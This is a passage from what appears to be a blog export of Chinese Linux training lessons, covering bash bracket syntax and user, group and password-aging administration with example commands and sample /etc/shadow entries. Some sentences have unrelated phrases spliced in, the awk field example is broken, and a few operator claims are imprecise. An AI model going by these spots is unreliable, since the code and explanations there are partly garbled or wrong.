        <category>技术培训</category>
        <category>LinuxBash脚本教程</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>LinuxBash脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>LINUX Shell Scripts 第五课 各种括号的作用</title>
    <url>/2016/12/23/booboo_bash_shell_scripts/04_shell_brackets/</url>
    <content><![CDATA[<h3 id="一、小括号-圆括号"><a href="#一、小括号-圆括号" class="headerlink" title="一、小括号,圆括号()"></a>一、小括号,圆括号()</h3><h4 id="1、单小括号"><a href="#1、单小括号" class="headerlink" title="1、单小括号 ()"></a>1、单小括号 ()</h4><p>1 命令组。括号中的命令将会新开一个子shell顺序执行,所以括号中的变量不能够被脚本余下的部分使用。括号中多个命令之间用分号隔开,最后一个命令可以没有分号,各命令和括号之间不必有空格。</p>
<p>2 命令替换。等同于<code>cmd</code>,shell扫描一遍命令行,发现了$(cmd)结构,便将$(cmd)中的cmd执行一次,得到其标准输出,再将此输出放到原来命令。有些shell不支持,如tcsh。</p>
<p>3 用于初始化数组。如:array=(a b c d)</p>
<h4 id="2、双小括号"><a href="#2、双小括号" class="headerlink" title="2、双小括号 (( ))"></a>2、双小括号 (( ))</h4><p>1 整数扩展。这种扩展计算是整数型的计算,不支持浮点型。((exp))结构扩展并计算一个算术表达式的值,如果表达式的结果为0,那么返回的退出状态码为1,或者 是”假”,而一个非零值的表达式所返回的退出状态码将为0,或者是”true”。若是逻辑判断,表达式exp为真则为1,假则为0。</p>
<p>2 只要括号中的运算符、表达式符合C语言运算规则,都可用在$((exp))中,甚至是三目运算符。作不同进位(如二进制、八进制、十六进制)运算时,输出结果全都自动转化成了十进制。如:echo $((16#5f)) 结果为95(16进位转十进制)</p>
<p>3 单纯用 (( )) 也可重定义变量值,比如 a=5; ((a++)) 可将 $a 重定义为6</p>
<p>4 常用于算术运算比较,双括号中的变量可以不使用$符号前缀。括号内支持多个表达式用逗号分开。 只要括号中的表达式符合C语言运算规则,比如可以直接使用for((i=0;i&lt;5;i++)), 如果不使用双括号, 则为for i in <code>seq 04</code>或者for i in {0..4}。再如可以直接使用if (($i&lt;5)), 如果不使用双括号, 则为if [ $i -lt 5 ]。</p>
<h3 id="二、中括号-方括号"><a href="#二、中括号-方括号" class="headerlink" title="二、中括号,方括号[]"></a>二、中括号,方括号[]</h3><h4 id="1、单中括号"><a href="#1、单中括号" class="headerlink" title="1、单中括号 []"></a>1、单中括号 []</h4><p>1 bash 的内部命令,[和test是等同的。如果我们不用绝对路径指明,通常我们用的都是bash自带的命令。if/test结构中的左中括号是调用test的命令标识,右中括号是关闭条件判断的。这个命令把它的参数作为比较表达式或者作为文件测试,并且根据比较的结果来返回一个退出状态码。if/test结构中并不是必须右中括号,但是新版的Bash中要求必须这样。</p>
<p>2 Test和[]中可用的比较运算符只有==和!=,两者都是用于字符串比较的,不可用于整数比较,整数比较只能使用-eq,-gt这种形式。无论是字符串比较还是整数比较都不支持大于号小于号。如果实在想用,对于字符串比较可以使用转义形式,如果比较”ab”和”bc”:[ ab &lt; bc ],结果为真,也就是返回状态为0。[ ]中的逻辑与和逻辑或使用-a 和-o 表示。</p>
<p>3 字符范围。用作正则表达式的一部分,描述一个匹配的字符范围。作为test用途的中括号内不能使用正则。</p>
<p>4 在一个array 结构的上下文中,中括号用来引用数组中每个元素的编号。</p>
<h4 id="2、双中括号"><a href="#2、双中括号" class="headerlink" title="2、双中括号[[ ]]"></a>2、双中括号[[ ]]</h4><p>1 [[是 bash 程序语言的关键字。并不是一个命令,[[ ]] 结构比[ ]结构更加通用。在[[和]]之间所有的字符都不会发生文件名扩展或者单词分割,但是会发生参数扩展和命令替换。</p>
<p>2 支持字符串的模式匹配,使用=~操作符时甚至支持shell的正则表达式。字符串比较时可以把右边的作为一shell中各种括号的作用()、个模式,而不仅仅是一个字符串,比如[[ hello == hell? ]],结果为真。[[ ]] 中匹配字符串或通配符,不需要引号。</p>
<p>3 使用[[ … ]]条件判断结构,而不是[ … ],能够防止脚本中的许多逻辑错误。比如,&amp;&amp;、||、&lt;和&gt; 操作符能linux shell下除了某个文件外的其他文件全部删除够正常存在于[[ ]]条件判断结构中,但是如果出现在[ ]结构中的话,会报错。比如可以直接使用if [[ $a != 1 &amp;&amp;$a != 2 ]], 如果不适用双括号, 则为if [ $a -ne 1] &amp;&amp; [ $a != 2 ]或者if [ $a -ne 1 -a $a != 2 ]。</p>
<p>4 bash把双中括号中的表达式看作一个单独的元素,并返回一个退出状态码。</p>
<h3 id="三、大括号、花括号"><a href="#三、大括号、花括号" class="headerlink" title="三、大括号、花括号 {}"></a>三、大括号、花括号 {}</h3><h4 id="1、常规用法"><a href="#1、常规用法" class="headerlink" title="1、常规用法"></a>1、常规用法</h4><p>1 大括号拓展。(通配(globbing))将对大括号中的文件名做扩展。在大括号中,不允许有空白,除非这个空白被引用或转义。第一种:对大括号中的以逗号分割的文件列表进行拓展。如 touch {a,b}.txt 结果为a.txt b.txt。第二种:对大括号中以点点(..)分割的顺序文件列表起拓展作用,如:touch {a..d}.txt 结果为a.txt b.txt c.txtd.txt</p>
<p>2 代码块,又被称为内部组,这个结构事实上创建了一个匿名函数 。与小括号中的命令不同,大括号内的命令不会新开一个子shell运行,即脚本余下部分仍可使用括号内变量。括号内的命令间用分号隔开,最后一个也必须有分号。{}的第一个命令和左括号之间必须要有一个空格</p>
<h4 id="2、几种特殊的替换结构"><a href="#2、几种特殊的替换结构" class="headerlink" title="2、几种特殊的替换结构"></a>2、几种特殊的替换结构</h4><p>${var:-string},${var:+string},${var:=string},${var:?string}</p>
<p>1 ${var:-string}和${var:=string}:若变量var为空,则用在命令行中用string来替换${var:-string},否则变量var不为空时,则用变量var的值来替换${var:-string};对于${var:=string}的替换规则和${var:-string}是一样的,所不同之处是${var:=string}若var为空时,用string替换${var:=string}的同时,把string赋给变量var:${var:=string}很常用的一种用法是,判断某个变量是否赋值,没有的话则给它赋上一个默认值。</p>
<p>2 ${var:+string}的替换规则和上面的相反,即只有当var不是空的时候才替换成string,若var为空时则不替换或者说是替换成变量 var的值,即空值。(因为变量var此时为空,所以这两种说法是等价的)</p>
<p>3 ${var:?string}替换规则为:若变量var不为空,则用变量var的值来替换${var:?string};若变量var为空,则把string输出到标准错误中,并从脚本中退出。我们可利用此特性来检查是否设置了变量的值。</p>
<p>补充扩展:在上面这五种替换结构中string不一定是常值的,可用另外一个变量的值或是一种命令的输出。</p>
<h4 id="3、四种模式匹配替换结构"><a href="#3、四种模式匹配替换结构" class="headerlink" title="3、四种模式匹配替换结构"></a>3、四种模式匹配替换结构</h4><p>模式匹配记忆方法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 是去掉左边(在键盘上<span class="comment">#在$之左边)</span></span></span><br><span class="line"><span class="meta">%</span><span class="bash"> 是去掉右边(在键盘上%在$之右边)</span></span><br><span class="line"><span class="meta">#</span><span class="bash">和%中的单一符号是最小匹配,两个相同符号是最大匹配。</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;var%pattern&#125;,<span class="variable">$&#123;var%%pattern&#125;</span>,<span class="variable">$&#123;var#pattern&#125;</span>,<span class="variable">$&#123;var##pattern&#125;</span></span></span><br></pre></td></tr></table></figure>
<h4 id="4、字符串提取和替换"><a href="#4、字符串提取和替换" class="headerlink" title="4、字符串提取和替换"></a>4、字符串提取和替换</h4><p>${var:num},${var:num1:num2},${var/pattern/pattern},${var//pattern/pattern}</p>
<ul>
<li>第一种模式:${var:num},这种模式时,shell在var中提取第num个字符到末尾的所有字符。若num为正数,从左边0处开始;若num为负数,从右边开始提取字串,但必须使用在冒号后面加空格或一个数字或整个num加上括号,如${var: -2}、${var:1-3}或${var:(-2)}。</li>
<li>第二种模式:${var:num1:num2},num1是位置,num2是长度。表示从$var字符串的第$num1个位置开始提取长度为$num2的子串。不能为负数。</li>
<li>第三种模式:${var/pattern/pattern}表示将var字符串的第一个匹配的pattern替换为另一个pattern。 。</li>
<li>第四种模式:${var//pattern/pattern}表示将var字符串中的所有能匹配的pattern替换为另一个pattern。</li>
</ul>
<h3 id="四、符号-后的括号"><a href="#四、符号-后的括号" class="headerlink" title="四、符号$后的括号"></a>四、符号$后的括号</h3><ul>
<li>(1) ${a} 变量a的值, 在不引起歧义的情况下可以省略大括号。</li>
<li>(2) $(cmd) 命令替换,和<code>cmd</code>效果相同,结果为shell命令cmd的输,过某些Shell版本不支持$()形式的命令替换, 如tcsh。</li>
<li>(3) $((expression)) 和<code>exprexpression</code>效果相同, 计算数学表达式exp的数值, 其中exp只要符合C语言的运算规则即可, 甚至三目运算符和逻辑表达式都可以计算。</li>
</ul>
<h3 id="五、使用多条命令执行"><a href="#五、使用多条命令执行" class="headerlink" title="五、使用多条命令执行"></a>五、使用多条命令执行</h3><ul>
<li>(1)单小括号,(cmd1;cmd2;cmd3) 新开一个子shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开,最后一个命令后可以没有分号。</li>
<li>(2)单大括号,{ cmd1;cmd2;cmd3;} 在当前shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后必须有分号, 第一条命令和左括号之间必须用空格隔开。对{}和()而言, 括号中的重定向符只影响该条命令, 而括号外的重定向符影响到括号中的所有命令。</li>
</ul>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>LinuxBash脚本教程</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>LinuxBash脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 用户和组</title>
    <url>/2016/12/22/booboo_linux_base/02-Linux%E7%94%A8%E6%88%B7%E5%92%8C%E7%BB%84/</url>
    <content><![CDATA[<h2 id="课堂作业"><a href="#课堂作业" class="headerlink" title="课堂作业"></a>课堂作业</h2><ol>
<li>添加2个组，一个组名为justice，另外一个组名为ninja。</li>
<li>添加4个新用户，分别为 superman、batman、wonderwoman、greenlantern，密码均为uplooking；其附加组为justice。</li>
<li>添加4个新用户，分别为 leo、raph、mikey、don ，密码均为uplooking，其附加组为ninja。</li>
<li>mikey用户总是在系统里搞破坏，root决定封他的号，让他不能登陆。过了几天，再解封。</li>
<li>leo想加入justice，root同意了，将justice作为附加组添加给leo。</li>
<li>don整天搞创造，root要求他的密码要更安全，所以将他的密码设置成7天之后要换密码，并且密码过期前3天要提醒他，如果密码过期后2天还没有设置新密码，那么就封锁don账户。</li>
<li>batman总是喜欢修改密码，没事就在修改密码，而使用该batman账户的人有好几个，比如蝙蝠侠，蝙蝠侠的管家，蝙蝠侠的助手罗宾等等。所以root决定将batman账户的密码的最小存活期改为10天。也就是说10天之内batman账户不能修改密码。</li>
<li>leo想退出justice,root帮他设置一下。</li>
<li>superman想把密码改为uplooking123，让他自己改。发现改不了，密码太简单了，自己去想一个复杂的密码。</li>
<li>让superman能够修改root用户的密码。</li>
</ol>
<h2 id="用户和组的相关文件"><a href="#用户和组的相关文件" class="headerlink" title="用户和组的相关文件"></a>用户和组的相关文件</h2><table>
<thead>
<tr>
<th align="left">文件名</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">/etc/passwd</td>
<td align="left">系统中的账号信息</td>
</tr>
<tr>
<td align="left">etc/shadow</td>
<td align="left">存放密码及其策略相关信息</td>
</tr>
<tr>
<td align="left">/etc/group</td>
<td align="left">存放用户组的信息</td>
</tr>
<tr>
<td align="left">/etc/gshadow</td>
<td align="left">存放用户组的密码及其策略相关信息</td>
</tr>
<tr>
<td align="left">/etc/default/useradd</td>
<td align="left">创建新用户时默认的配置信息</td>
</tr>
<tr>
<td align="left">/etc/skel/*</td>
<td align="left">Directory containing default files.</td>
</tr>
<tr>
<td align="left">/etc/login.defs</td>
<td align="left">用户和组默认的配置信息</td>
</tr>
<tr>
<td align="left">/etc/shells</td>
<td align="left">该文件记录着合法的 shell 版本</td>
</tr>
</tbody></table>
<h3 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h3><p>每一行都代表一个账号 , 有几行就代表有几个账号在你的系统中</p>
<p>系统统账号: bin, daemon, adm, nobody</p>
<p>以“：”作为分隔符,七个字段</p>
<p><code>root:x:0:0:root:/root:/bin/bash</code> </p>
<ol>
<li><p>账号名称 :root</p>
</li>
<li><p>密码 :X</p>
</li>
<li><p>UID: 使用者标识符<br>rhel6 root_uid=0 sys_uid=1-499 user_uid=500-65535 ( 2^32-1 )<br>rhel7 root_uid=0 sys_uid=201-999 user_uid=1000-65535</p>
</li>
<li><p>GID: 用户组标识符 root_guid=0</p>
</li>
<li><p>用户信息说明栏 </p>
</li>
<li><p>家目录 : 用户的家目录 root 的家目录在 /root, 默认用户的家目录在 /home/yourname</p>
</li>
<li><p>Shell: 命令解释器</p>
<ul>
<li>系统默认为 /bin/bash</li>
</ul>
</li>
</ol>
<ul>
<li>/sbin/nologin 不可通过终端登录系统</li>
</ul>
<h3 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h3><p>存放密码及其策略相关信息</p>
<p>以“：”作为分隔符九个字段</p>
<p><code>root:$1$/30QpE5e$y9N/D0bh6rAACBEz.hqo00:14126:0:99999:7:::</code></p>
<ol>
<li>账号名称 :root</li>
<li>密码 : 加密后的字符串，以$N$ 开头</li>
<li>最近变更密码的日期 : 天数,以 1970 年 1 月 1 日作为 1 而累加的日期<br>echo $(($(date –date=”2008/09/04” +%s)/86400+1))<br>14126</li>
<li>密码不可被更改的天数 :0 : 表示密码随时可以更改， 20 :表示 距最近一次修改密码20 天之内都不能修改密码</li>
<li>密码需要重新变更的天数 :99999 ( 计算为 273 年 ) 表示密码的变更没有强制性。</li>
<li>密码需要变更期限前的警告天数 : 在密码到期之前几天提醒</li>
<li>密码过期后的账号宽限时间 ( 密码失效日 ): 密码过期特性。</li>
<li>账号失效日期 : 天数，以 1970 年 1 月 1 日作为 1 而累加的日期</li>
<li>保留 : 保留段</li>
</ol>
<h3 id="etc-group"><a href="#etc-group" class="headerlink" title="/etc/group"></a>/etc/group</h3><p>存放用户组的信息</p>
<p>每一行代表一个群组以“：”作为分隔符四个字段</p>
<p><code>root:x:0:root</code></p>
<ol>
<li>组名 :root</li>
<li>群组密码 :x 一般不设定,通常是给『群组管理员』使用</li>
<li>GID: 群组的 ID</li>
<li>此群组支持的账号名称 : 一个账号可以加入多个群组</li>
</ol>
<p>例如,将 dabao 加入 root 群组后 :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root:x:0:root,dmtsai</span><br></pre></td></tr></table></figure>

<h3 id="etc-gshadow"><a href="#etc-gshadow" class="headerlink" title="/etc/gshadow"></a>/etc/gshadow</h3><p>存放用户组的密码及其策略相关信息</p>
<p>每一行代表一个群组 “: ” 作为分隔符四个字段</p>
<p><code>newgroup:!::redhat</code></p>
<ol>
<li>组名 :newgroup</li>
<li>密码栏 : 开头为 ! 表示无合法密码 , 所以无群组管理员</li>
<li>群组管理员的账号</li>
<li>此群组支持的账号名称 : 与 /etc/group 相同</li>
</ol>
<h3 id="etc-default-useradd"><a href="#etc-default-useradd" class="headerlink" title="/etc/default/useradd"></a>/etc/default/useradd</h3><p>创建新用户时默认的配置信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GROUP=100 &lt;== 预设的群组，现已不生效，如果创建用户时不指定群组，则使用与用户同名的群组</span><br><span class="line">HOME=/home &lt;== 默认的家目录所在目录</span><br><span class="line">INACTIVE=-1 &lt;== 密码失效日 , 在 shadow 第 7 栏</span><br><span class="line">EXPIRE= &lt;== 账号失效日 , 在 shadow 第 8 栏</span><br><span class="line">SHELL=/bin/bash &lt;== 预设的 shell /sbin/nologin 将无法登陆</span><br><span class="line">SKEL=/etc/skel&lt;== 用户家目录的内容数据参考目录</span><br><span class="line">CREATE_MAIL_SPOOL=yes &lt;== 是否主动帮助使用者建立邮件信箱 (mailbox)</span><br></pre></td></tr></table></figure>


<h3 id="etc-skel"><a href="#etc-skel" class="headerlink" title="/etc/skel/"></a>/etc/skel/</h3><p>Directory containing default files.</p>
<p>.bash_logout .bash_profile .bashrc .gnome2 .mozilla</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 skel]# ll -a /etc/skel</span><br><span class="line">total 40</span><br><span class="line">drwxr-xr-x. 4 root root 4096 Jan 2 01:58 .</span><br><span class="line">drwxr-xr-x. 125 root root 12288 Mar 21 03:09 ..</span><br><span class="line">-rw-r--r--. 1 root root 18 Jul 9 2013 .bash_logout</span><br><span class="line">-rw-r--r--. 1 root root 176 Jul 9 2013 .bash_profile</span><br><span class="line">-rw-r--r--. 1 root root 124 Jul 9 2013 .bashrc</span><br><span class="line">-rw-r--r--. 1 root root 500 May 7 2013 .emacs</span><br><span class="line">drwxr-xr-x. 2 root root 4096 Jul 14 2010 .gnome2</span><br><span class="line">drwxr-xr-x. 4 root root 4096 Jan 2 01:52 .mozilla</span><br></pre></td></tr></table></figure>

<h3 id="etc-login-defs"><a href="#etc-login-defs" class="headerlink" title="/etc/login.defs"></a>/etc/login.defs</h3><p>默认的配置信息 rhel6 下的信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">MAIL_DIR           /var/spool/mail 用户默认邮件信箱放置目录</span><br><span class="line">PASS_MAX_DAYS      99999 /etc/shadow 第 5 栏 , 密码需要重新变更的天数</span><br><span class="line">PASS_MIN_DAYS      0 /etc/shadow 第 4 栏 , 密码不可被更动的天数</span><br><span class="line">PASS_MIN_LEN       5 密码最短的字符长度 , 已被 pam 模块取代 , 失去效用 !</span><br><span class="line">PASS_WARN_AGE      7 /etc/shadow 第 6 栏 , 过期前会警告天数</span><br><span class="line">UID_MIN            500 使用者最小的 UID 不能 &lt;500</span><br><span class="line">UID_MAX            60000  使用者最大的 UID 不能 &gt;60000</span><br><span class="line">GID_MIN            500  自定义组最小的 UID 不能 &lt;500</span><br><span class="line">GID_MAX            60000  自定义组最大的 UID 不能 &gt;60000</span><br><span class="line">CREATE_HOME     yes  在 username 命令不加 -M 及 -m 时 , 是否主动建立用户家目录</span><br><span class="line">UMASK        077  用户家目录建立的 umask , 因此权限会是 700 『 drwx------ 』</span><br><span class="line">USERGROUPS_ENAB  yes  使用 userdel 时 , 是否会删除初始群组(如果使用 userdel 去删除一个账号时 , 该账号所属的初始群组已经没有人隶属于该群组了 , 那举就删掉该群组)</span><br><span class="line">ENCRYPT_METHOD    SHA512  经过 SHA512 进行加密处理</span><br></pre></td></tr></table></figure>

<h3 id="etc-shells"><a href="#etc-shells" class="headerlink" title="/etc/shells"></a>/etc/shells</h3><p>该文件记录着合法的 shell 版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 skel]# cat /etc/shells</span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/sbin/nologin</span><br><span class="line">/bin/dash</span><br><span class="line">/bin/tcsh</span><br><span class="line">/bin/csh</span><br></pre></td></tr></table></figure>

<h2 id="用户和组的相关命令"><a href="#用户和组的相关命令" class="headerlink" title="用户和组的相关命令"></a>用户和组的相关命令</h2><table>
<thead>
<tr>
<th align="left">用户和组</th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">新建组</td>
<td align="left">groupadd</td>
</tr>
<tr>
<td align="left">新建用户</td>
<td align="left">useradd</td>
</tr>
<tr>
<td align="left">修改密码</td>
<td align="left">passwd 密码 &gt;8 位字符、小写 / 大写 / 数字 / 特殊符号之间任选 3 位</td>
</tr>
<tr>
<td align="left">修改用户属性</td>
<td align="left">usermod</td>
</tr>
<tr>
<td align="left">修改组属性</td>
<td align="left">groupmod</td>
</tr>
<tr>
<td align="left">修改密码属性</td>
<td align="left">chage</td>
</tr>
<tr>
<td align="left">修改 shell</td>
<td align="left">chsh</td>
</tr>
<tr>
<td align="left">删除用户</td>
<td align="left">userdel</td>
</tr>
<tr>
<td align="left">删除组</td>
<td align="left">groupdel</td>
</tr>
<tr>
<td align="left">查看已存在用户的基本信息</td>
<td align="left">id</td>
</tr>
<tr>
<td align="left">查看当前用户支持的群组信息</td>
<td align="left">groups</td>
</tr>
</tbody></table>
<p>通过文件查看</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">/etc/shadow</span><br><span class="line">/etc/group</span><br><span class="line">/etc/gshadow</span><br></pre></td></tr></table></figure>

<h3 id="新建用户和组"><a href="#新建用户和组" class="headerlink" title="新建用户和组"></a>新建用户和组</h3><h4 id="groupadd"><a href="#groupadd" class="headerlink" title="groupadd"></a>groupadd</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">groupadd 创建组</span><br><span class="line">-g, --gid GID</span><br><span class="line">-r, --system  Create a system group</span><br><span class="line"></span><br><span class="line"> 新建组 test 制定 gid 为 888</span><br><span class="line">[root@rhel7 ~]# groupadd -g 888 test</span><br><span class="line"> 新建一个系统组 baby</span><br><span class="line">[root@rhel7 ~]# groupadd -r baby</span><br><span class="line"> 查看一下刚刚新建的组的信息</span><br><span class="line">[root@rhel7 ~]# tail -n 2 /etc/group</span><br><span class="line">test:x:888:</span><br><span class="line">baby:x:490:</span><br></pre></td></tr></table></figure>

<h4 id="useradd"><a href="#useradd" class="headerlink" title="useradd"></a>useradd</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">创建新用户</span><br><span class="line">useradd [-u UID] [-g 初始群组 ] [-G 次要群组 ] [-mM] [-c 说明栏 ] [-d 家目录绝对路径 ] [-s shell] 账号名</span><br><span class="line">拓展: -e : 接日期『 YYYY-MM-DD 』 shadow 第八字段账号失效日期</span><br><span class="line"> 	-f : 接天数 shadow 第七字段密码失效日 0 :立刻失效 -1 :永不失效</span><br><span class="line">		失效后可登陆,但是会强制你重新设置密码</span><br><span class="line">[root@rhel7 ~]# useradd -u 888 -g 888 -f 0 -e 2016-03-21 t1</span><br><span class="line">[root@rhel7 ~]# id t1</span><br><span class="line">uid=888(t1) gid=888(test) groups=888(test)</span><br><span class="line">[root@rhel7 ~]# tail -n 1 /etc/passwd</span><br><span class="line">t1:x:888:888::/home/t1:/bin/bash</span><br><span class="line">[root@rhel7 ~]# tail -n 1 /etc/shadow</span><br><span class="line">t1:!!:16880:0:99999:7:0:16881:</span><br></pre></td></tr></table></figure>

<h4 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给用户设置密码</span><br><span class="line">passwd [--sdtin] &lt;&#x3D;&#x3D; 所有人均可使用更改自己的密码</span><br><span class="line">passwd [-l] [-u] [--sdtin] [-S] [-n 日数 ] [-x 日数 ] [-w 日数 ] [-i 日期 ] 账号 &lt;&#x3D;&#x3D;root 功能</span><br><span class="line">选项与参数 :</span><br><span class="line">--stdin : 可以透过来自前一个管线的数据 , 作为密码输入 echo 123 | passwd --stdin dabao</span><br><span class="line">-l : 是 Lock 的缩写 , 会将 &#x2F;etc&#x2F;shadow 第二栏最前面加上 ! 使密码失效</span><br><span class="line">-u : 与 -l 相对 , 是 Unlock 的缩写</span><br><span class="line">-S : 列出密码相关参数 shadow 大部分信息。</span><br><span class="line">-n : 后面接天数 ,shadow 第 4 字段 , 密码不可被更动的天数</span><br><span class="line">-x : 后面接天数 ,shadow 第 5 字段 , 密码需要重新变更的天数</span><br><span class="line">-w : 后面接天数 ,shadow 第 6 字段 , 密码需要变更期限前的警告天数</span><br><span class="line">-i : 后面接天数 ,shadow 第 7 字段 , 密码失效日期</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# passwd t1</span><br><span class="line">Changing password for user t1.</span><br><span class="line">New password:</span><br><span class="line">BAD PASSWORD: it is based on a dictionary word</span><br><span class="line">Retype new password:</span><br><span class="line">passwd: all authentication tokens updated successfully.</span><br><span class="line"></span><br><span class="line"> 设置密码失效日期为 7 天</span><br><span class="line">[root@rhel7 ~]# passwd -i 7 t1</span><br><span class="line">Adjusting aging data for user t1.</span><br><span class="line">passwd: Success</span><br><span class="line"></span><br><span class="line"> 查看记录用户密码属性的文件 /etc/shadow ,截取 t1 用户的那一行</span><br><span class="line">[root@rhel7 ~]# sed -n '/t1/p' /etc/shadow</span><br><span class="line">t1:$6$TDnycU/C$0AmM5AoZmoHZQMex.dQCoroH2JxdSnDhLnBMorcUPlWgshYrlstZJmH.Q.fT</span><br><span class="line">OTV.pECGEuqFqugj8YccRqcdD/:16880:0:99999:7:7:16881:</span><br><span class="line"></span><br><span class="line"> 截取 t1 用户密码属性,以 : 为分割的第 7 字段</span><br><span class="line">[root@rhel7 ~]# sed -n '/t1/p' /etc/shadow|cut -d":" -f 7</span><br><span class="line">7</span><br><span class="line">[root@rhel7 ~]# sed -n '/t1/p' /etc/shadow|awk -F: '&#123;print 7&#125;'</span><br><span class="line">7</span><br></pre></td></tr></table></figure>

<h3 id="修改用户和组属性"><a href="#修改用户和组属性" class="headerlink" title="修改用户和组属性"></a>修改用户和组属性</h3><h4 id="groupmod"><a href="#groupmod" class="headerlink" title="groupmod"></a>groupmod</h4><p>修改组属性</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">groupmod -g gid [gname] 修改 gid</span><br><span class="line">groupmod -n new_gname [gname] 修改组的名字</span><br><span class="line">[root@rhel7 ~]# groupmod -g 999 test</span><br><span class="line">[root@rhel7 ~]# grep test /etc/group</span><br><span class="line">test:x:999:</span><br><span class="line">[root@rhel7 ~]# groupmod -n test1 test</span><br><span class="line">[root@rhel7 ~]# grep test /etc/group</span><br><span class="line">test1:x:999:</span><br></pre></td></tr></table></figure>

<h4 id="usermod"><a href="#usermod" class="headerlink" title="usermod"></a>usermod</h4><p>修改用户属性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usermod [-cdegGlsuLU] username</span><br><span class="line">选项不参数 :</span><br><span class="line">-c : 后面接账号的说明 修改 &#x2F;etc&#x2F;passwd 第 5 字段</span><br><span class="line">-d : 后面接账号的家目录 修改 &#x2F;etc&#x2F;passwd 第 6 字段</span><br><span class="line">-e : 后面接日期 , 格式是 YYYY-MM-DD 修改 shadow 第 8 字段 ( 账号失效日 )</span><br><span class="line">-f : 后面接天数 修改 shadow 第 7 字段 ( 密码失效日期 )</span><br><span class="line">-g : 后面接初始群组 修改 &#x2F;etc&#x2F;passwd 第 4 字段 GID</span><br><span class="line">-G : 后面接次要群组 , 修改这个使用者能够支持的群组 修改 &#x2F;etc&#x2F;group</span><br><span class="line">-aG : 『增加次要群组的支持』而非『设定』</span><br><span class="line">-l : 后面接账号名称 修改账号名称 修改 &#x2F;etc&#x2F;passwd 第 1 字段</span><br><span class="line">-s : 后面接 Shell 的实际档案 , 例如 &#x2F;bin&#x2F;bash &#x2F;bin&#x2F;csh 等等</span><br><span class="line">-u : 后面接 UID 数字啦 ! 卲 &#x2F;etc&#x2F;passwd 第三栏的资料 ;</span><br><span class="line">-L : 暂时将用户的密码冻结 , 让他无法登入。修改 &#x2F;etc&#x2F;shadow 密码栏</span><br><span class="line">-U : 将 &#x2F;etc&#x2F;shadow 密码栏的 ! 拿掉 , 解冻</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# usermod -g test2 -G test3 t1</span><br><span class="line">[root@rhel7 ~]# id t1</span><br><span class="line">uid=888(t1) gid=1000(test2) groups=1000(test2),1001(test3)</span><br><span class="line">[root@rhel7 ~]# usermod -s /sbin/nologin t1</span><br><span class="line">[root@rhel7 ~]# grep t1 /etc/passwd</span><br><span class="line">t1:x:888:1000::/home/t1:/sbin/nologin</span><br><span class="line">[root@rhel7 ~]# su - t1</span><br><span class="line">This account is currently not available.</span><br></pre></td></tr></table></figure>

<h4 id="chage"><a href="#chage" class="headerlink" title="chage"></a>chage</h4><p>修改用户密码属性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chage [-ldEImMW] 账号名</span><br><span class="line">选项与参数 :</span><br><span class="line">-l : 列出该账号的详细密码参数 ;</span><br><span class="line">-d : 后面接日期 , 修改 shadow 第 3 字段 ( 最近一次更改密码的日期 ), 格式 YYYY-MM-DD</span><br><span class="line">-m : 后面接天数 , 修改 shadow 第 4 字段 ( 密码不可被更动的天数 )</span><br><span class="line">-M : 后面接天数 , 修改 shadow 第 5 字段 ( 密码需要重新变更的天数 )</span><br><span class="line">-W : 后面接天数 , 修改 shadow 第 6 字段 ( 密码需要变更期限前的警告天数 )</span><br><span class="line">-I : 后面接天数 , 修改 shadow 第 7 字段 ( 密码失效日期 )</span><br><span class="line">-E : 后面接日期 , 修改 shadow 第 8 字段 ( 账号失效日 ), 格式 YYYY-MM-DD</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# chage t1</span><br><span class="line">Changing the aging information for t1</span><br><span class="line">Enter the new value, or press ENTER for the default</span><br><span class="line">Minimum Password Age [0]:</span><br><span class="line">Maximum Password Age [99999]:</span><br><span class="line">Last Password Change (YYYY-MM-DD) [2016-03-20]:</span><br><span class="line">Password Expiration Warning [7]:</span><br><span class="line">Password Inactive [7]:</span><br><span class="line">Account Expiration Date (YYYY-MM-DD) [2016-03-21]:</span><br></pre></td></tr></table></figure>

<h4 id="chsh"><a href="#chsh" class="headerlink" title="chsh"></a>chsh</h4><p>change shell 的简写</p>
